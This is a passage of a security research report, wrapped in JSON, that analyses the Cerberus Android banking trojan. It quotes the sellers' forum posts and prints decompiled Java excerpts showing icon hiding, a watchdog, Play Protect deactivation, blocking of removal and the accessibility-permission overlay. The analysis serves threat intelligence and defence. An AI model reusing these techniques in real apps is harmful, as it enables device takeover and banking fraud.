{
    "id": "4fbf15d6-99c9-40af-a81b-f5f594fa069d",
    "created_at": "2022-10-25T16:48:19.919761Z",
    "updated_at": "2025-03-27T02:16:59.17858Z",
    "deleted_at": null,
    "sha1_hash": "69e3a1f86807d951a291a40f8f7279ef779fff4d",
    "title": "Microsoft Word - Cerberus Mobile Malware Analysis Final(1).docx",
    "authors": "",
    "file_creation_date": "2020-08-28T10:00:53Z",
    "file_modification_date": "2020-08-28T10:00:53Z",
    "file_size": 5852811,
    "plain_text": "**_C_**\n\n\n# CERBERUS BANKING TROJAN\n ANALYSIS\n\n\n-----\n\n**Disclaimer**\n\nAll information contained in this document is public information and researched by Cyberwise Researchers. Disclosure or use of\nany information contained in this document by photographic, electronic or any other means, in whole or part, for any reason other\nis strictly prohibited without written consent. Cyberwise shall assume no liability for any changes, omissions, or errors in this\ndocument. All the recommendations are provided on as is basis and are void of any warranty expressed or implied.\n\n**Cyberwise Research Task Force**\n\n   - Ali Rıza Şahinkaya\n\n   - Can Atakan Işık\n\n   - Rıdvan Ethem Canavar\n\n\n-----\n\n**TABLE OF CONTENTS**\n\n**Executive Summary ............................................................................................................................................................ .**\n\n**Introduction ............................................................................................................................................................... 1**\n\n**Cerberus Developers and Their Operation ................................................................................................................. 2**\n\n**Cerberus Clients and Their Operations ....................................................................................................................... 4**\n\n**Evolution of Cerberus Malware .................................................................................................................................. 5**\n\n**Technical Analysis ...................................................................................................................................................... 7**\n\n**Anti-Analysis Techniques ....................................................................................................................................... 7**\n\n**Persistence ............................................................................................................................................................ 7**\n\n**Gaining Accessibility Permission .......................................................................................................................... 12**\n\n**Abusing Accessibility ............................................................................................................................................ 14**\n\n**What We Know About The Command & Control Server ....................................................................................... 17**\n\n**Gathering Device Information .............................................................................................................................. 20**\n\n**Downloaded Module ........................................................................................................................................... 22**\n\n**Remote Control ................................................................................................................................................... 22**\n\n**Grabber ............................................................................................................................................................... 24**\n\n**Dialer - SMS Interception ..................................................................................................................................... 25**\n\n**Remote App Removal and Self Destruction .......................................................................................................... 27**\n\n**Mitigation and Countermeasures ............................................................................................................................. 28**\n\n**Future of Cerberus ................................................................................................................................................... 29**\n\n**Sources .................................................................................................................................................................... 30**\n\n**Appendix.A – Count of Detected Cerberus - Daily ............................................................................................................. 31**\n\n**Appendix.B – Known Injection List ................................................................................................................................... 32**\n\n**Appendix.C – IoC Table ..................................................................................................................................................... 34**\n\n**Appendix.D – Turkish Banks Injection Overlays ................................................................................................................ 36**\n\n\n-----\n\n## Executive Summary\n\nToday’s cyber world is swarming full of mobile devices. Each day more and more companies are starting to use mobile devices.\nWith this rising trend in usage of mobile devices and applications, this landscape became one of the main concerns in cyber security\narea. In this report we will be giving in-depth information about a specific malware targeting banking apps. Fortunately, if correct\nmitigations and countermeasures are applied, these fraud attempts and violations can be acknowledged and prevented\nbeforehand.\n\n**Banking-Trojan: Malicious apps or sites specifically targeting banking sites and apps.**\n\n**Injections: Injections can be described as ‘overlays mimicking target app or site in order to gain trust of the user’. For Banking-**\nTrojans injections are used to mimic banks login screens, this usage of injections aims to gain users trust by faking the real bank\napplication.\n\n**Overlay: One can describe overlays as ‘a new layer set between user and real application login screen.**\n\nIn our research, we discovered groups particularly targeting Turkish banks via using Banking-Trojans. With usage of this malicious\napplication, they are capable of stealing user credentials such as credit card numbers, citizen number, banking credentials etc.\nAfter acquiring victim’s information, these groups are using obtained credentials to withdraw money from victims’ bank.\n\nIn Federal Bureau of Investigation’s documentation[1] alone, a near loss of $3.000.000.000 reported in the past year over through\nInternet crimes. In our research we were also able to confirm that, there are many victims from Turkey still using infected devices\nactively. Each of these individuals are getting target based on their used mobile banking applications.\n\nWithin this new era even the devices we carry all day long with us is not secure if they are not managed and secured properly.\nInvestigation of this specific attack surface can reduce economical damage dramatically by all means. Also, it should be mentioned\nthat investigation and addressing of these targeted fraud attempts is in both favour of companies and their customers.\n\n1 https://pdf.ic3.gov/2019_IC3Report.pdf\n\n\n-----\n\n## Introduction\n\nWith the start of the global pandemic, actors started distributing malicious codes to internet using pandemic related apps / sites.\nOne of the specific rising attack vectors related to this new event is Banking-Trojans. Some groups started targeting specific\ncountries and sectors with the new-normal. Actors are distributing their malware with a simple methodology, promising free aid /\nmoney or in some cases only data related to current COVID-19 situation. As research suggest some of these actors are specifically\ntargeting Turkish citizens / banks and causing massive amounts of economic damage.\n\nFigure 1.1 Example Website Template Related to Fraud\n\nBanking-Trojans can be described as malwares specifically targeting apps or sites directly related to the banks themselves, but new\ngeneration Banking-Trojans are much more capable than that. With this new generation Banking-Trojans actors are not only\ncompromising users’ credentials for bank accounts but also acquiring full control of the victims’ phone. In this research we will be\ninvestigating one of the most powerful Android Banking-Trojan ever made until now, called ‘Cerberus’.\n\nCerberus malware’s first version was detected back in June 2019 by security researchers hence the developers claimed that it was\nused for 2 years ‘privately’. Cerberus can be categorized as **MaaS (Malware-as-a-Service). Developers also claimed that they**\ncreated the malware from scratch, unlike other Banking-Trojans in the wild Cerberus is not built on an existing malware they claim.\nIt uses a similar procedure used in most of the banking trojans known as phishing via usage of overlays. It has some unseen features\ncompared to the previous Android banking trojans. One of the most interesting features is; when bot is deployed after acquiring\naccessibility rights, bot just abuses accessibility functions to give itself more permissions and perform some action commands\nreceived from the C2.\n\nIn our research we were able to detect more than 160 effected applications by Cerberus injection overlays. These injections are\ntargeting a large usage area including social media, communication apps and foremost mobile banking applications. For public\nsafety / awareness we are publishing the list of injection overlays in this paper.\n\nFor injection list please visit Appendix.B\n\n\n-----\n\n## Cerberus Developers and Their Operation\n\nIn June 2019, a user called 'ANDROID' started a thread called Cerberus in xxs[.]is, a well-known Russian underground forum. In\nthread they claimed that they were selling a new generation, written from scratch Android malware.\n\nFigure 2.1 Initial Post, retrieved from xss[.]is\n\nAs a MaaS product they were ‘renting’ this service to their customer from a base price starting at $4.000. With this initial post they\nalso posted first generation bot’s features.\n\n\n\n- Sending SMS\n\n- 2FA grabber\n\n- Interception SMS\n\n- Hidden interception of SMS\n\n- Device lock\n\n- Mute sound\n\n- Keylogger (messengers, watts app, telegram secret, banks, etc., except browsers!)\n\n- Execution of USSD commands\n\n- Call Forwarding\n\n- Opening the fake page of the bank\n\n- Run any installed application\n\n- Push Bank Notification (Auto Push - determines which bank is installed)\n\n- Open URL in browser\n\n- Get all installed applications\n\n- Get all the contacts of their phone book\n\n- Get all saved SMS\n\n- Remove any application\n\n- Self-destruct bot\n\n- Automatic confirmation of rights and permissions\n\n- A bot can have several spare url to connect to the server\n\n- Injects (html + js + css, download to the device and run from disk, poor connection or lack of internet\nwill not affect the operation of injects)\n\n- Grabber cards\n\n- Grabber mail\n\n- Automatic inclusion of injections through the time specified in the admin panel\n\n- Automatically shut off Google Play Protect + disconnect after the time specified in the admin panel\n\n- Anti-emulator (Bot starts working after device activity)\n\n\nFigure 2.2 Initial Bot Features, retrieved from xss[.]is\n\nIn the initial post they also mentioned parameters sent by the bots to C2.\n\n\n-----\n\nFigure 2.3 Initial Bot Parameters, retrieved from xss[.]is\n\nThis post also had some insight features related to the Administration Panel.\n\nFigure 2.4 Administration Panel Features, retrieved from xss[.]is\n\nDevelopers were also cautious about bots' secrecy. A client was constantly uploading the new-build Cerberus examples to an\nantivirus site. They immediately revoked the licence of that client.\n\nFigure 2.5 Revoking a Client’s License, retrieved from xss[.]is\n\n\n-----\n\n## Cerberus Clients and Their Operations\n\nCerberus clients main concern was distributing and using the malware as efficiently as possible. They also said, ‘we are short on\ninjections depending on different countries.’. Mainly Cerberus clients were paying third parties for their injection kits and proxy\nserver related problems. Because of this demand situation developers stated that they prepared injection kits for most affected\ncountries and most viable customers. They also prepared a special offer for a period of time.\n\nFigure 3.1 Injection Kits Made by Developers, retrieved from xss[.]is\n\nAfter some time in the market developers made a public announcement stating their operational capacity is full, so no license will\nbe distributed until someone else's expires. It is observed that they had specific groups / partners targeting specific countries.\n\n## EN\nAnd so, I hasten to inform you that we are going into private.\nFrom this moment on, the sale of the bot is suspended, and we will sell it only upon the availability of\nvacant seats.\nWe have recruited a base of paying clients who work as a bot correctly. Many who ruined the lives of others\nleft without extending the lease, for some we did not extend the lease, since they did not know how to\nwork with apk.\nIf you have any questions about the bot, write in private messages.\nWe will publish information about updates to keep the topic up to date.\n## RU\nИ так, спешу вам сообщить, что мы уходим в приват.\nС этого момента продажи бота приостанавливаются, и мы будем продавать его только по наличию\nосвободившихся мест.\nМы набрали базу платёжеспособных клиентов, которые правильно работают ботом. Многие, кто\nпортил жизнь другим ушли, не продливая аренду, некоторым аренду не продлили мы, так как они не\nумели работать с апк.\nЕсли у вас есть вопросы по боту, пишите в личные сообщения.\nИнформацию об обновлениях будем публиковать, чтобы поддерживать тему актуальнной.\n\nFigure 3.2 Developers Going Private, retrieved from xss[.]is\n\n\n-----\n\n## Evolution of Cerberus Malware\n\nOn April 3 2020, developers of Cerberus announced Cerberus v2. They also stated that if clients are currently a subscriber for\nCerberus v1.0, clients can upgrade it to Cerberus v2.0 freely.\n\nSome of eye-catching newly added functions are;\n\n   - Added 2FA grabber from Google Authenticator.\n\n   - Keylogger now successfully reads information from push notifications. (for banks with 2FA)\n\n   - Cerberus v2.0 is capable of disabling Google Play Protect by itself.\n\n   - Fundamental change in injection process and usability.\n\n   - New functions are added to prevent antivirus detection.\n\n\nCerberus v2 relesed in an open test for our customers.\nSupport v1 will be relevant until May 1. After all the old panels will stop working.\nSwitching to v2 is free\n\nList of changes:\n\n  - The logic of the bot has been rewritten almost from scratch, now antivirus companies will not be\nable to kill bots with groups of play protect so easily\n\n  - The admin rights on Samsung are fixed, and their receipt on all devices (Except Xiaomi). Admin\nrights are needed to lock the phone\n\n  - The injection system has been changed, now the injections are all in the same table, and there are\nno grabCC and grabMails. Each application has its own injection. Backward compatibility with old\ninjections saved.\n\n  - In the injection system, resource loading from outside is now available. You can embed images\nfrom the url in the html file, and also load css styles from third-party resources. Previously, we\nremoved this feature, and injections with similar functionality did not work.\n\n  - Added 2FA grabber from google authenticator\n\n  - Added send SMS to all accounts\n\n  - Added support for Android 10\n\n  - Fixed hiding SMS on most devices\n\n  - Keylogger now successfully reads information from push notifications (for banks with 2FA)\n\n  - Moved the builder to the panel\n\n  - Updates are now automatically installed on your server.\n\n  - Fixed problems with the \"lags\" of the panel. Now the panel stably works with 5000 online bots\n(with 12 GB of RAM)\n\n  - Added support for more than 64 additional domains for the bot. Prior to this, bots did not see\nadditional domains, if there are more than 64 of them.\n\n  - Departure from apache2 on the server side towards performance. Now everything works on nginx.\n\n  - Removed getting \"extra\" rights. The victim will now have fewer pop-ups.\n\n  - Added another method to protect against bot removal\n\n  - Hidden main module on the victim's phone. Now, antivirus companies won’t know at all that the\nvictim’s phone has a bot based on module signatures.\n\nAddition for clients: during v2 tests we had a working build leaked and anti-virus bots got into the panel.\nPlay Protect was turned off on all phones. Conclusion - disabling Play Protect does not affect the operation\nof the bot.\nThere are also many convenient changes in the panel for good usability.\nAlso, over time, we will add various functionality for obtaining information from popular applications\n(example 2FA).\nThis is done for free if many clients need it.\nWe do not change the pricing policy due to lack of funds from our customers.\nWash your hands, keep your distance ^_^\n\n\nFigure 4.1 Post Related to Release of Cerberus v2, retrieved from xss[.]is\n\nWith the new version of Cerberus users are able to create their own injections from the admin panel.\n\n\n-----\n\nFigure 4.2 Injection Generator from The Admin, retrieved from xss[.]is\n\nThey also published some example injections made by them. Real apps’ fonts and app images were used by Cerberus developers\nto make it look like the real apps window.\n\nFigure 4.3 Example Injections Published by Developers, retrieved from xss[.]is\n\n\n-----\n\n## Technical Analysis\n\nIn this section, we will talk about malwares’ technical analysis. For sole purpose of analysing Cerberus malware, we have written\nscripts mainly focusing analysis of Cerberus. Developed scripts are able to get config variables of the malware statically. Tools made\nfor this research can be found on GitHub.\n\nhttps://github.com/ics-iot-bootcamp/cerberus_research\n\nThird-party tools used in this research is shown in Figure 5.1.\n\nApktool Wireshark ADB Androguard\nByte Code Viewer JD-GUI NetBeans 8.1\nFigure 5.1 Third-Party Tools\n\nAnti-Analysis Techniques\n\nMost of Cerberus samples examined in the research were dropped by a dropper. Obfuscated dropper contains junk code and\nunrelated files from random applications alongside its main code to confuse analysts and security software. In result, it basically\nuses XOR cipher to decrypt its strings including name of the file to be loaded and the decryption key.\n\nDroppers RC4 implementation takes file name and decryption key and decrypts the RC4 encrypted file in its “assets/” directory.\nThe resulting DEX file is loaded with the help of DexClassLoader method (Compilation is performed by ART's dex2oat tool) and\nthen actual Cerberus code invoked.\n\nActual Cerberus code is not heavily obfuscated. It contains junk classes, but the actual code is fine. Strings in actual Cerberus code\nare encrypted with RC4 and they are decrypted in runtime.\n\nPersistence\n\nCerberus hides its own icon after launch, tries to get accessibility permission to use its’ persistence features. For this, it sets an\nalarm to be triggered every 1 second. Whenever this alarm is triggered, it checks battery optimization status, status of its services\nand the availability of accessibility permission. If there is no accessibility permission, it shows a message that redirects to the\npermission page until this permission is granted by the user.\n\nAccessibility permission is particularly important for Cerberus, as all of its core functions are based on exploiting this feature. After\nobtaining the accessibility permission, it opens and approves other permission pages itself.\n\nIf the user goes to the Android's setting page to remove features that would interfere with Cerberus's operation, Cerberus exploits\naccessibility, presses the back key and removes the user from the setting page and reports removal attempt to the command\ncontrol.\n\nHiding app icon to avoid getting noticed by the user:\n\n1. public static void _enableConfigXMLComponent(Context var0) {\n2. ComponentName cn = new ComponentName(var0, _ENTRYPOINTConfigXML.class);\n3. var0.getPackageManager().setComponentEnabledSetting(cn, PackageManager.COMPONENT_ENABLED_STATE_DISABLED,\nPackageManager.DONT_KILL_APP);\n4. }\n\nFigure 5.2.1 Java Code\n\n|Apktool|Wireshark|ADB|Androguard|\n|---|---|---|---|\n|Byte Code Viewer|JD-GUI|NetBeans 8.1||\n\n\n-----\n\nWatchdog Method That Uses AlarmManager:\n\n1. public static void _startRepeatRequest(Context var0, String var1, long var2) {\n2. try {\n3. Intent var4 = new Intent(var0, _receiveSMSnStartJobs.class);\n4. var4.setAction(var1);\n5. PendingIntent var6 = PendingIntent.getBroadcast(var0, 0, var4, 0);\n6. ((AlarmManager)var0.getSystemService(\"alarm\")).setRepeating(0, System.currentTimeMillis() + var2, var2,\nvar6);\n7. }catch (Exception var5) {\n8. var5.printStackTrace();\n9. }\n10. }\n\nFigure 5.2.2 Java Code\n\nCall to Watchdog Method:\n\n1. .\n2. .\n3. _Utils._startRepeatRequest(this, \"\", 10000L);\n4. this._utils._patcherClassStart((Context)this);\n5. .\n6. .\n\nFigure 5.2.3 Java Code\n\nShows Fullscreen Intent If Accessibility Permission Not Present:\n\n1. .\n2. .\n3. Notification var9 = var6.setSmallIcon(var7.getIdentifier(var8.toString(), (String)null, (String)null))\n4. .setContentTitle(_title)\n5. .setContentText(_body)\n6. .setFullScreenIntent(_foreignIntent, true)\n7. .setOngoing(true)\n8. .setAutoCancel(true)\n9. .getNotification();\n10. .\n11. .\n\nFigure 5.2.4 Java Code\n\nFigure 5.2.5 Enable Accessibility\n\n\nFigure 5.2.5 Enable Accessibility\n\n\n-----\n\nCerberus uses service code that is not affected by battery optimization settings (battery optimization may cause Cerberus to sleep\nand stop) and this code is triggered at startup.\n\n*Research showed that this method was actually copied and pasted from this blog post:\nhttps://robertohuertas.com/2019/06/29/android_foreground_services/\n\n1. public IBinder onBind(Intent var1) {\n2. this.a._logcatError(decryptedStr(\"EndLess\"), decryptedStr(\"Some component want to bind with the\nservice\"));\n3. return null;\n4. }\n\nFigure 5.2.6 Java Code\n\nCerberus can turn off notifications to prevent the user from noticing:\n\n1. public static void _muteAudio(Context var0) {\n2. try {\n3. AudioManager var2 = (AudioManager)var0.getSystemService(\"audio\");\n4. var2.setStreamMute(1, true);\n5. var2.setStreamMute(3, true);\n6. var2.setStreamVolume(4, 0, 0);\n7. var2.setStreamVolume(8, 0, 0);\n8. var2.setStreamVolume(5, 0, 0);\n9. var2.setStreamVolume(2, 0, 0);\n10. var2.setVibrateSetting(1, 0);\n11. }catch (Exception var1) {\n12. }\n13. }\n\nFigure 5.2.7 Java Code\n\nCerberus is able to lock the device if it has administrator privileges:\n\n1. .\n2. .\n3. .\n4. ((DevicePolicyManager)this.getSystemService(\"device_policy\")).lockNow();\n5. .\n6. .\n7. .\n\nFigure 5.2.8 Java Code\n\nCerberus may try to disable Google Play Protect:\n\n1. if (_Utils._isAccessibilityServiceEnabled((Context)this, (Class)_accessibilityAbuser.class)\n2. && _Utils._isKeyguardEnabledBool(this)\n3. && this._utils._readSharedPreference(this, this._strings._isPlayProtectEnabled).equals(decryptedStr(\"1\"))\n4. && var11 > Integer.parseInt(this._utils._readSharedPreference(this, this._strings._PlayProtectRelated))){\n5. if (VERSION.SDK_INT >= 25) {\n6. this._utils._writeSharedPreference(this, this._strings._triedtoInvokePlayProtectActivity,\ndecryptedStr(\"1\"));\n7. try{\n8. var1 = new\nIntent(decryptedStr(\"com.google.android.gms.security.settings.VerifyAppsSettingsActivity\"));\n9. var1.setClassName(decryptedStr(\"com.google.android.gms\"),\ndecryptedStr(\"com.google.android.gms.security.settings.VerifyAppsSettingsActivity\"));\n10. var1.addFlags(268435456);\n11. var1.addFlags(8388608);\n12. this.startActivity(var1);\n13. }catch (Exception var21) {\n14. var1 = new\n\nIntent(decryptedStr(\"com.google.android.gms.security.settings.VerifyAppsSettingsActivity\"));\n15. var1.setClassName(decryptedStr(\"com.google.android.gms\"),\n\ndecryptedStr(\"com.google.android.gms.security.settings.VerifyAppsSettingsActivity\"));\n16. this.startActivity(var1);\n17. }\n18. }\n19. else {\n20. this._utils._writeSharedPreference(this, this._strings._triedtoInvokePlayProtectActivity,\n\ndecryptedStr(\"1\"));\n\n\n-----\n\n21. var1 = new\n\n\nIntent(decryptedStr(\"com.google.android.gms.security.settings.VerifyAppsSettingsActivity\"));\n22. var1.setClassName(decryptedStr(\"com.google.android.gms\"),\n\ndecryptedStr(\"com.google.android.gms.security.settings.VerifyAppsSettingsActivity\"));\n23. var1.addFlags(268435456);\n24. var1.addFlags(8388608);\n25. this.startActivity(var1);\n26. }\n27. }\n\nFigure 5.2.9 Java Code\n\nIf Cerberus has accessibility permission, it prevents the user's deactivation attempts through and reports the attempt to the C2.\n\nBot may prevent its removal:\n\n1. if (this.i.contains(this._utils._getApplicationLabel(this).toLowerCase())\n2. && !this.i.contains(this._strings.I.toLowerCase())){\n3. this._tapGoBack4Times();\n4. var86 = this._utils;\n5. var91 = this._strings._SMSRelated;\n6. var96 = new StringBuilder();\n7. var96.append(decryptedStr(\"Blocked attempt to remove bot\"));\n8. var96.append(decryptedStr(\"[143523#]\"));\n9. var86._writeSharedPreferenceAppend(this, var91, var96.toString());\n10. }\n\nFigure 5.2.10 Java Code\n\nIt can block the removal of the accessibility permission if it is present. (If there is two different Cerberus installed on the device,\none of them will be trying to open the accessibility permission page and the other one will block the page from opening)\n\n1. if (VERSION.SDK_INT > 15\n2. && decryptedStr(\"com.android.settings.SubSettings\").equals(var1.getClassName())\n3. && this.i.equals(this._strings._campaignPkgName.toLowerCase())){\n4. this._tapGoBack4Times();\n5. this._utils._writeSharedPreferenceAppend(this, this._strings._SMSRelated, decryptedStr(\"Blocked attempt to\ndisable accessibility service[143523#]\"));\n6. }\n\nFigure 5.2.11 Java Code\n\nIt can block the removal of device admin:\n\n1. if (this.j.equals(decryptedStr(\"com.android.settings.deviceadminadd\"))\n2. && CerberusNW._Utils._isDeviceAdminActive(this)){\n3. this._tapGoBack4Times();\n4. var86 = this._utils;\n5. var6 = this._strings._SMSRelated;\n6. var3 = new StringBuilder();\n7. var3.append(decryptedStr(\"Blocked attempt to disable admin device\"));\n8. var3.append(decryptedStr(\"[143523#]\"));\n9. var86.writeSharedPreferenceAppend(this, var6, var3.toString());\n10. }\n\nFigure 5.2.12 Java Code\n\n\n-----\n\nCerberus can provide remote management with Teamviewer. Therefore, it will also prevent Teamviewer from being removed.\n\n1. if (this.i.contains(decryptedStr(\"host\"))\n2. && this._utils._readSharedPreference(this, this._strings.aJ).equals(decryptedStr(\"true\"))){\n3. this._tapGoBack4Times();\n4. var94 = this._utils;\n5. var91 = this._strings._SMSRelated;\n6. StringBuilder var88 = new StringBuilder();\n7. var88.append(decryptedStr(\"Blocked attempt to remove TeamViewer\"));\n8. var88.append(decryptedStr(\"[143523#]\"));\n9. var94._writeSharedPreferenceAppend(this, var91, var88.toString());\n10. }\n11. if (var1.getPackageName().toString().contains(decryptedStr(\"com.google.android.packageinstaller\")) &&\n\nthis.j.contains(decryptedStr(\"android.app.alertdialog\"))\n12. && this.i.contains(decryptedStr(\"host\"))\n13. && this._utils._readSharedPreference(this, this._strings.aJ).equals(decryptedStr(\"true\"))){\n14. this._tapGoBack4Times();\n15. var86 = this._utils;\n16. var91 = this._strings._SMSRelated;\n17. var96 = new StringBuilder();\n18. var96.append(decryptedStr(\"Blocked attempt to remove TeamViewer\"));\n19. var96.append(decryptedStr(\"[143523#]\"));\n20. var86._writeSharedPreferenceAppend(this, var91, var96.toString());\n21. }\n\nFigure 5.2.13 Java Code\n\nResearch indicates that some samples are avoiding from running if mobile network country code matches any of listed countries:\n\n   - Ukraine\n\n   - Russia\n\n   - Belarus\n\n   - Tajikistan\n\n   - Uzbekistan\n\n   - Turkmenistan\n\n   - Azerbaijan\n\n   - Armenia\n\n   - Kazakhstan\n\n   - Kyrgyzstan\n\n   - Moldova\n\nIt should be noted that, all these countries listed above were part of the Soviet Union.\n\n1. public void onReceive(Context context, Intent object) {\n2. Object object2;\n3. Object object3;\n4. int n;\n5. block13 : {\n6. try {\n7. CharSequence charSequence;\n8. if (this.b._readSharedPreference(context, \"kill\").contains(this.a.aT)) return;\n9. if (this.b._isAvoidedCountry(context)) return;\n10. this.b._logcatError(this.d, \"START >> Boot Receiver\");\n11. object3 = this.b;\n12. .\n13. .\n14. .\n\nFigure 5.2.14 Java Code\n\n\n-----\n\nGaining Accessibility Permission\n\nThe malware creates a html page using the code block shown in Figure 5.3.1.\n\n1. protected void onCreate(Bundle var1) {\n2. super.onCreate(var1);\n3. if (_Utils._isAccessibilityServiceEnabled((Context)this, (Class)_accessibilityAbuser.class)) {\n4. this.finish();\n5. }\n6. String var6;\n7. label17: {\n8. this.c = new WebView(this);\n9. this.c.getSettings().setJavaScriptEnabled(true);\n10. this.c.setScrollBarStyle(0);\n11. this.c.setWebViewClient(new _accessibilityPermReqUIhtml.b((byte)0));\n12. this.c.setWebChromeClient(new _accessibilityPermReqUIhtml.a((byte)0));\n13. this.c.addJavascriptInterface(new _accessibilityPermReqUIhtml.WebAppInterface(this),\n\ndecryptedStr(\"Android\"));\n14. StringBuilder var5 = new StringBuilder();\n15. var5.append(this._strings.bc);\n16. var5.append(this._strings.bd);\n17. var5.append(this._strings.be);\n18. var5.append(this._strings.bf);\n19. var5.append(this._strings.bg);\n20. String var2 = _Utils._Base64DecodeWebSafe(var5.toString());\n21. String var3 = Locale.getDefault().getLanguage().toLowerCase();\n22. var6 = decryptedStr(\"var lang = 'en'\");\n23. StringBuilder var4 = new StringBuilder();\n24. var4.append(decryptedStr(\"var lang = '\"));\n25. var4.append(var3);\n26. var4.append(decryptedStr(\"'\"));\n27. var6 = var2.replace(var6, var4.toString()).replace(decryptedStr(\"Start Accessibility\"),\n\nthis._strings._campaignPkgName);\n28. if (decryptedStr(\"xiaomi\").equalsIgnoreCase(Build.MANUFACTURER)) {\n29. if (_Utils._getMIUIVersion() >= 11) {\n30. var3 = decryptedStr(\"%Enable_Accessibility_Service%\");\n31. var4 = new StringBuilder();\n32. var4.append(this._utils._genAcsbltyPermReqNotifBodyOPENMOREDOWNLOADEDSERVICES());\n33. var4.append(this._utils._genAcsbltyPermReqNotifBodyACTIVATE());\n34. var6 = var6.replace(var3, var4.toString());\n35. break label17;\n36. }\n37. _Utils._getMIUIVersion();\n38. }\n39. var6 = var6.replace(decryptedStr(\"%Enable_Accessibility_Service%\"),\n\nthis._utils._genAcsbltyPermReqNotifBodyACTIVATE());\n40. }\n41. this.c.loadDataWithBaseURL((String)null, var6, decryptedStr(\"text/html\"), \"UTF-8\", (String)null);\n42. this.setContentView(this.c);\n43. }\n\nFigure 5.3.1 Accesibility Overlay\n\nIn the above code, onCreate function creates some webkit objects like WebChromeClient, WebView, WebViewClients, etc. and\nfetches Base64 encoded strings from an encrypted Java class in line between 15-19 and appends these strings to construct HTML\ncode to be rendered. Also, the malware controls if the device is Xiaomi or not. If the device is Xiaomi, then the malware adds some\nspecific strings to the screen like “Open More downloaded services >”. After this process, appending strings were decrypted and\nthe page in Figure 5.3.2 has been created.\n\n\n-----\n\nFigure 5.3.2 Enable Accessibility Page\n\nAlso, the strings “%Enable_Accessibility_Service%” and “Start Accessibility” in the screen had been changed in real-time with\nprefix string (Enable) + package name like e-Devlet, eDestek, EvdeHayatVar20GB, etc.\n\nWithin the above accessibility HTML page, we detected a javascript code presence. Within this code block, 34 other languages are\nprovided for stability / reliability of injections. The provided languages are as shown in Figure 5.3.3.\n\nAfrikaans Czech Greek Japanese Portuguese Swedish\nArabic Danish Hebrew Korean Romanian Thai\nBulgarian Dutch Hindi Latvian, Lettish Serbian Turkish\nCatalan English Hungarian Lithuanian Slovak Vietnamese\nChinese Finnish Indonesian Norwegian Slovenian\nCroatian German Italian Polish Spanish\nFigure 5.3.3 Provided Languages\n\nSo in this page, if the user click the **Start Accessibility** or the button provided in the bottom of the page, malware starts the\n**android.settings.ACCESSIBILITY_SETTINGS intent using the onclick methods in the Figure 5.3.4 and Figure 5.3.5.**\n\n1. <div class=\"an\">\n2. <div class=\"els\" onclick=\"Android.openAccessibilityService();\">\n3. <div class=\"nm\">\n4. <b id=\"startaccessability\">Start Accessibility</b>\n5. </div>\n6. <div id=\"off2\" class=\"vl\">OFF</div>\n7. </div>\n8. </div>\n\nFigure 5.3.4 HTML Part - 1\n\n1. <div class=\"btn_div\">\n2. <button onclick=\"Android.openAccessibilityService();\" class=\"btn  btn-outline-success\"> >>\n3. </button>\n4. </div>\n\nFigure 5.3.5 HTML Part – 2\n\n|Afrikaans|Czech|Greek|Japanese|Portuguese|Swedish|\n|---|---|---|---|---|---|\n|Arabic|Danish|Hebrew|Korean|Romanian|Thai|\n|Bulgarian|Dutch|Hindi|Latvian, Lettish|Serbian|Turkish|\n|Catalan|English|Hungarian|Lithuanian|Slovak|Vietnamese|\n|Chinese|Finnish|Indonesian|Norwegian|Slovenian||\n|Croatian|German|Italian|Polish|Spanish||\n\n\n-----\n\n**openAccessibilityService() method in the onclick event as you can see in the Figure 5.3.6 creates a new intent.**\n\n1. public class WebAppInterface {\n2. Context mContext;\n3.\n4. WebAppInterface(Context var2) {\n5. this.mContext = var2;\n6. }\n7.\n8. @JavascriptInterface\n9. public void openAccessibilityService() {\n10. accessibilityPermReqUIhtml.this.startActivity(new Intent(\"android.settings.ACCESSIBILITY_SETTINGS\"));\n11. }\n12. }\n\nFigure 5.3.6 Java Code\n\nWhen the new settings intent starts, application that installed by the user, wants to get some permissions.\n\nFigure 5.3.7 Accessibility Popup\n\nIf user provide required permissions for malware, it starts abusing accessibility setting on the device.\n\nAbusing Accessibility\n\nIn this section, we will mention how malware abuses accessibility mechanism of the infected device.\n\nDevice users all activity is tracked by the malware. For example, if user launches settings window malware is also aware of this.\n\n\npackageApp{com.android.settings} strText{security & location}\nclassName{com.android.settings.settings$securitysettingsactivity}\npackageApp{com.android.settings} strText{settings} className{com.android.settings.settings}\npackageApp{com.android.settings} strText{settings} className{com.android.settings.settings}\npackageApp{com.android.settings} strText{accessibility}\nclassName{com.android.settings.settings$accessibilitysettingsactivity}\npackageApp{com.android.settings} strText{settings} className{com.android.settings.settings}\npackageApp{com.android.settings} strText{settings} className{com.android.settings.settings}\npackageApp{com.android.launcher3} strText{apps list} className{com.android.launcher3.launcher}\npackageApp{com.android.launcher3} strText{home screen 1 of 1} className{com.android.launcher3.launcher}\npackageApp{com.android.launcher3} strText{home screen 1 of 1} className{com.android.launcher3.launcher}\n\n\nFigure 5.4.1 Logcat Output\n\n\n-----\n\nIf the user tries to remove the infected application or tries to turn off the accessibility of the malicious application, it prevents the\nuser from removing the malware by executing the function in Figure 5.4.2. This function varies depending on the launched activity.\nFor specific activities, malware executes a function to go back 4 times from current activity.\n\n1. private void _tapGoBack2Times() {\n2. if (VERSION.SDK_INT > 15) {\n3. for(int var1 = 0; var1 < 2; ++var1) {\n4. this.performGlobalAction(1); // It triggers GLOBAL_ACTION_BACK event.\n5. }\n6. }\n7. }\n\nFigure 5.4.2 Java Code\n\nIn settings, first the malware detects if user logged in to Google Play Store. After that it checks if Google Play Protect is turned on\nor off. If Google Play Protect settings are active like in the Figure 5.4.3, it tries to deactivate them via abusing accessibility settings\nof the device.\n\nFigure 5.4.3 Play Protect settings\n\nFor deactivation process of Google Play Protect, malware stores important data related to this action on var7 in Figure 5.4.4 .\n\n1. var7 = new String[]{\n2. decryptedStr(\"com.android.vending:id/toolbar_item_play_protect_settings\")\n3.,decryptedStr(\"com.android.vending:id/play_protect_settings\")\n4.,decryptedStr(\"android:id/button1\")};\n\nFigure 5.4.4 Java Code\n\n1. do {\n2. if (!var6.hasNext()) {\n3. continue label121;\n4. }\n5. ((AccessibilityNodeInfo)var6.next()).performAction(16);\n6. this.d = decryptedStr(\"1\");\n7. }while(!var7[var5].equals(decryptedStr(\"android:id/button1\")));\n8. this._tapGoBack2Times();\n\nFigure 5.4.5 Java Code\n\nAnd then, the malware, using the performAction(16) function -integer 16 refers to ACTION_CLICK- as you can see above, clicks the\ntoggle buttons. After the process, the malware tells the system to go back 2 times. Thus, deactivating had been done.\n\nIn some situations, the device wants to get some permission with user interaction like ALLOW – DENY or YES-NO. The malware\ncontrols these permissions like you can see in the Figure 5.4.6.\n\n1. var98 = new String[]{\n2. 